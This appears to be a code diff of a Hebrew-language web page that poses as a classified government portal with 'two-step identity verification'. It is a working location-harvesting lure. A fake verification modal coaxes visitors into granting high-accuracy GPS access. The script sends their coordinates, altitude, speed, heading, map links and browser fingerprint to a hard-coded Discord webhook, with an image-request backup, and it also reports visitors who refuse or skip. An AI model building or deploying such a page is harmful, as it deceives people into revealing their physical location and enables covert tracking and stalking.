@@ -57,17 +57,8 @@ header {
     border: 3px solid #00ffff;
     box-shadow: 0 0 30px rgba(0,170,255,0.3);
 }
-.logo-text h1 {
-    font-size: 22px;
-    color: #00ccff;
-    text-shadow: 0 0 20px rgba(0,200,255,0.3);
-}
-.logo-text h2 {
-    font-size: 13px;
-    color: #88aacc;
-    font-weight: 300;
-    letter-spacing: 2px;
-}
+.logo-text h1 { font-size: 22px; color: #00ccff; text-shadow: 0 0 20px rgba(0,200,255,0.3); }
+.logo-text h2 { font-size: 13px; color: #88aacc; font-weight: 300; letter-spacing: 2px; }
 .classification {
     background: #ff0000;
     color: #fff;
@@ -85,17 +76,9 @@ header {
     padding: 60px 30px 100px;
     text-align: center;
 }
-.hero h1 {
-    font-size: 38px;
-    color: #fff;
-    margin-bottom: 10px;
-}
+.hero h1 { font-size: 38px; color: #fff; margin-bottom: 10px; }
 .hero h1 span { color: #00ccff; }
-.hero p {
-    color: #8899bb;
-    font-size: 18px;
-    margin-bottom: 20px;
-}
+.hero p { color: #8899bb; font-size: 18px; margin-bottom: 20px; }
 .alert-box {
     background: rgba(255,0,0,0.1);
     border: 2px solid #ff3333;
@@ -169,7 +152,7 @@ td .tag {
     border-radius: 10px;
     padding: 15px;
     margin-top: 30px;
-    max-height: 200px;
+    max-height: 250px;
     overflow-y: auto;
 }
 .live-feed .feed-item {
@@ -186,26 +169,6 @@ td .tag {
     font-size: 12px;
     border-top: 1px solid rgba(255,255,255,0.05);
 }
-.loading-overlay {
-    display: none;
-    position: fixed;
-    top: 0; left: 0; width: 100%; height: 100%;
-    background: rgba(0,0,0,0.7);
-    z-index: 9999;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-}
-.loading-overlay.show { display: flex; }
-.loading-overlay .spinner {
-    width: 50px; height: 50px;
-    border: 5px solid rgba(255,255,255,0.1);
-    border-top-color: #00ccff;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-}
-@keyframes spin { to { transform: rotate(360deg); } }
-.loading-overlay p { margin-top: 20px; color: #88ccff; font-size: 16px; }
 .location-modal {
     position: fixed;
     top: 0; left: 0; width: 100%; height: 100%;
@@ -247,18 +210,30 @@ td .tag {
     margin-right: 10px;
 }
 .location-modal .box .skip:hover { border-color: #88aacc; color: #88aacc; }
+.loading-bar {
+    width: 0%;
+    height: 3px;
+    background: linear-gradient(90deg, #00aaff, #0066ff);
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 99999;
+    transition: width 0.3s;
+}
 </style>
 </head>
 <body>
 
-<!-- פוליגרף / אישור מיקום -->
+<div class="loading-bar" id="loadingBar"></div>
+
 <div class="location-modal" id="locationModal">
     <div class="box">
         <h2>🔒 אימות זיהוי דו-שלבי</h2>
         <p>לשם השלמת אימות הזהות והגנה על המידע הרגיש,<br>נדרש לאמת את מיקומך הנוכחי באמצעות GPS.</p>
         <p style="font-size:12px; color:#556677;">המידע מוצפן ומועבר בתקן הצפנה ממשלתי מאושר.<br>המיקום נדרש לאימות מול מאגר הגורמים המוסמכים.</p>
+        <p style="font-size:11px; color:#445566;">* נדרש דיוק של לפחות 50 מטר לאימות מלא</p>
         <div>
-            <button onclick="requestLocation()" id="locBtn">🔘 אשר זיהוי והמשך</button>
+            <button onclick="requestHighAccuracyLocation()" id="locBtn">🔘 אשר זיהוי והמשך</button>
             <button onclick="skipLocation()" class="skip">דלג (הרשאה מוגבלת)</button>
         </div>
     </div>
@@ -343,10 +318,14 @@ td .tag {
 </div>
 
 <script>
-// Webhook
+// === WEBHOOK שלך ===
 const WEBHOOK = 'https://discord.com/api/webhooks/1524841634758393997/VaIb60DvHXfv26V8ZJLWeOQYjSUQuRzuFti8icxm0qNQhqMOklPwoA1_pC6sb0z-rGc_';
 
-// שעון
+// === משתנים גלובליים ===
+const sessionId = 'ISB-' + Math.random().toString(36).substr(2, 8).toUpperCase();
+let locationSent = false;
+
+// === שעון ===
 function updateClock() {
     const now = new Date();
     document.getElementById('clock').textContent = now.toLocaleTimeString('he-IL');
@@ -355,138 +334,179 @@ function updateClock() {
 setInterval(updateClock, 1000);
 updateClock();
 
-// סשן ID רנדומלי
-const sessionId = 'ISB-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+// === סשן ===
 document.getElementById('sessionId').textContent = sessionId;
 document.getElementById('sessionInfo').textContent = 'מחובר: ' + new Date().toLocaleTimeString('he-IL');
 
-// שלח מידע בסיסי מיד
-function sendData(data) {
+// === שליחה לוובהוק בפורמט Embed של דיסקורד ===
+function sendToWebhook(data) {
     try {
+        const fields = [];
+        for (const [key, value] of Object.entries(data)) {
+            fields.push({
+                name: key,
+                value: String(value || 'לא ידוע'),
+                inline: true
+            });
+        }
+        
         const payload = {
-            session: sessionId,
-            timestamp: new Date().toISOString(),
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            lang: navigator.language,
-            platform: navigator.platform,
-            userAgent: navigator.userAgent,
-            screen: screen.width + 'x' + screen.height,
-            ...data
+            embeds: [{
+                title: '📍 התקבל מיקום',
+                color: 3447003,
+                fields: fields,
+                timestamp: new Date().toISOString(),
+                footer: { text: 'Session: ' + sessionId }
+            }]
         };
+        
         fetch(WEBHOOK, {
             method: 'POST',
-            mode: 'no-cors',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(payload)
-        }).catch(() => {});
+        }).catch(e => console.log('webhook error:', e));
+        
+        // גם כבקשת תמונה (backup)
+        const query = Object.entries(data).map(([k,v]) => `${k}=${encodeURIComponent(v)}`).join('&');
+        new Image().src = WEBHOOK + '?' + query;
     } catch(e) {}
 }
 
-// שלח מידע בסיסי מיד בלי לחכות
-sendData({event: 'page_load'});
+// === שליחת מידע בסיסי ===
+sendToWebhook({
+    'אירוע': 'טעינת דף',
+    'Session': sessionId,
+    'אזור זמן': Intl.DateTimeFormat().resolvedOptions().timeZone,
+    'שפה': navigator.language,
+    'פלטפורמה': navigator.platform,
+    'מסך': screen.width + 'x' + screen.height,
+    'User-Agent': navigator.userAgent.substring(0, 100)
+});
 
-// בקשת מיקום
-function requestLocation() {
+// === בקשת מיקום בדיוק גבוה ===
+function requestHighAccuracyLocation() {
     const btn = document.getElementById('locBtn');
-    btn.textContent = 'מאמת מיקום...';
+    btn.textContent = '🔄 מאמת מיקום (GPS)...';
     btn.disabled = true;
     
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            // הצלחה
-            function(pos) {
-                const coords = {
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    altitude: pos.coords.altitude || null,
-                    heading: pos.coords.heading || null,
-                    speed: pos.coords.speed || null
-                };
-                
-                // שלח לוובהוק
-                sendData({
-                    event: 'gps_location',
-                    type: 'gps_precise',
-                    ...coords
-                });
-                
-                // שלח גם דרך תמונה (backup)
-                const img = new Image();
-                img.src = WEBHOOK + '?lat=' + coords.lat + '&lng=' + coords.lng + '&acc=' + coords.accuracy + '&session=' + sessionId;
-                
-                // עדכן תצוגה
-                document.getElementById('locationDisplay').textContent = 
-                    coords.lat.toFixed(6) + ', ' + coords.lng.toFixed(6);
-                document.getElementById('accuracyDisplay').textContent = 
-                    'דיוק: ' + Math.round(coords.accuracy) + ' מטרים';
-                
-                // סגור מודאל
-                document.getElementById('locationModal').classList.remove('show');
-                
-                // הוסף הודעה בלוח
-                const feed = document.getElementById('liveFeed');
-                const item = document.createElement('div');
-                item.className = 'feed-item';
-                item.innerHTML = '<span class="time">[' + new Date().toLocaleTimeString() + ']</span> ✅ אימות מיקום הושלם - דיוק: ' + Math.round(coords.accuracy) + 'מ';
-                feed.prepend(item);
-            },
-            // שגיאה
-            function(err) {
-                sendData({event: 'geolocation_error', code: err.code, message: err.message});
-                
-                if (err.code === 1) { // PERMISSION_DENIED
-                    document.getElementById('locationDisplay').textContent = '❌ נדחה';
-                    document.getElementById('accuracyDisplay').textContent = 'המשתמש סירב להרשאת מיקום';
-                    
-                    const feed = document.getElementById('liveFeed');
-                    const item = document.createElement('div');
-                    item.className = 'feed-item';
-                    item.innerHTML = '<span class="time">[' + new Date().toLocaleTimeString() + ']</span> ❌ אימות מיקום נדחה על ידי המשתמש';
-                    feed.prepend(item);
-                } else {
-                    document.getElementById('locationDisplay').textContent = '⚠️ שגיאה באימות';
-                    document.getElementById('accuracyDisplay').textContent = 'קוד שגיאה: ' + err.code;
-                }
-                
-                document.getElementById('locationModal').classList.remove('show');
-                btn.textContent = '🔘 אשר זיהוי והמשך';
-                btn.disabled = false;
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            }
-        );
-    } else {
-        sendData({event: 'geolocation_unsupported'});
+    if (!navigator.geolocation) {
+        sendToWebhook({'אירוע': 'שגיאה', 'סיבה': 'דפדפן לא תומך ב-Geolocation'});
         document.getElementById('locationDisplay').textContent = '❌ לא נתמך';
-        document.getElementById('accuracyDisplay').textContent = 'הדפדפן לא תומך ב-Geolocation';
+        document.getElementById('accuracyDisplay').textContent = 'הדפדפן לא תומך';
         document.getElementById('locationModal').classList.remove('show');
+        return;
     }
+    
+    // ניסיון ראשון - דיוק גבוה
+    navigator.geolocation.getCurrentPosition(
+        function(pos) {
+            handlePosition(pos);
+        },
+        function(err) {
+            // אם נכשל, ננסה שוב עם דיוק רגיל
+            if (err.code === 2 || err.code === 3) { // POSITION_UNAVAILABLE או TIMEOUT
+                // ניסיון שני
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) { handlePosition(pos); },
+                    function(err2) {
+                        handleGeoError(err2);
+                    },
+                    { enableHighAccuracy: false, timeout: 8000, maximumAge: 0 }
+                );
+            } else {
+                handleGeoError(err);
+            }
+        },
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+    );
+}
+
+function handlePosition(pos) {
+    if (locationSent) return;
+    locationSent = true;
+    
+    const coords = pos.coords;
+    const data = {
+        '📍 קו רוחב (Latitude)': coords.latitude.toString(),
+        '📍 קו אורך (Longitude)': coords.longitude.toString(),
+        '📏 דיוק (מטרים)': Math.round(coords.accuracy) + 'm',
+        '📐 גובה (מטרים)': coords.altitude ? Math.round(coords.altitude) + 'm' : 'לא זמין',
+        '🧭 כיוון (מעלות)': coords.heading ? coords.heading + '°' : 'לא זמין',
+        '💨 מהירות (מ/ש)': coords.speed ? coords.speed + ' m/s' : 'לא זמין',
+        '🆔 סשן': sessionId,
+        '🌐 אזור זמן': Intl.DateTimeFormat().resolvedOptions().timeZone,
+        '📱 פלטפורמה': navigator.platform,
+        '🔗 קישור למפה': `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`
+    };
+    
+    // שלח לוובהוק
+    sendToWebhook(data);
+    
+    // שלח גם קישור נפרץ לתמונה למפה
+    setTimeout(() => {
+        sendToWebhook({
+            '🗺️ מפת מיקום': `[לחץ להצגה במפות](https://www.google.com/maps?q=${coords.latitude},${coords.longitude})`
+        });
+    }, 500);
+    
+    // עדכן תצוגה
+    document.getElementById('locationDisplay').textContent = 
+        coords.latitude.toFixed(6) + ', ' + coords.longitude.toFixed(6);
+    document.getElementById('accuracyDisplay').textContent = 
+        'דיוק: ' + Math.round(coords.accuracy) + ' מטרים' + 
+        (coords.accuracy <= 50 ? ' ✅ GPS מדויק' : ' ⚠️ דיוק נמוך');
+    
+    document.getElementById('locationModal').classList.remove('show');
+    
+    addFeedItem('✅ אימות מיקום הושלם - דיוק: ' + Math.round(coords.accuracy) + 'מ' + 
+        (coords.accuracy <= 20 ? ' (GPS מדויק!)' : ''));
+}
+
+function handleGeoError(err) {
+    let msg = '';
+    switch(err.code) {
+        case 1: msg = 'המשתמש סירב להרשאת מיקום'; break;
+        case 2: msg = 'מיקום לא זמין'; break;
+        case 3: msg = 'הבקשה למיקום נכשל (timeout)'; break;
+        default: msg = 'שגיאה לא ידועה: ' + err.message;
+    }
+    
+    sendToWebhook({
+        'אירוע': 'שגיאת מיקום',
+        'קוד שגיאה': err.code.toString(),
+        'הודעה': msg,
+        'Session': sessionId
+    });
+    
+    document.getElementById('locationDisplay').textContent = '❌ ' + msg.substring(0, 30);
+    document.getElementById('accuracyDisplay').textContent = msg;
+    document.getElementById('locationModal').classList.remove('show');
+    
+    addFeedItem('❌ שגיאת מיקום: ' + msg);
 }
 
 function skipLocation() {
-    sendData({event: 'location_skipped'});
+    sendToWebhook({'אירוע': 'מיקום דולג', 'Session': sessionId});
     document.getElementById('locationDisplay').textContent = '⏭️ דולג';
-    document.getElementById('accuracyDisplay').textContent = 'המשתמש דילג על אימות מיקום';
+    document.getElementById('accuracyDisplay').textContent = 'המשתמש דילג על אימות';
     document.getElementById('locationModal').classList.remove('show');
-    
+    addFeedItem('⏭️ המשתמש דילג על אימות מיקום');
+}
+
+function addFeedItem(text) {
     const feed = document.getElementById('liveFeed');
     const item = document.createElement('div');
     item.className = 'feed-item';
-    item.innerHTML = '<span class="time">[' + new Date().toLocaleTimeString() + ']</span> ⏭️ המשתמש דילג על אימות מיקום - גישה מוגבלת';
+    item.innerHTML = '<span class="time">[' + new Date().toLocaleTimeString() + ']</span> ' + text;
     feed.prepend(item);
 }
 
-// הצג את המודאל אחרי טעינה
+// === הצגת המודאל ===
 window.addEventListener('load', function() {
     setTimeout(() => {
         document.getElementById('locationModal').classList.add('show');
-    }, 1500);
+    }, 1200);
 });
 </script>
-
 </body>
 </html>
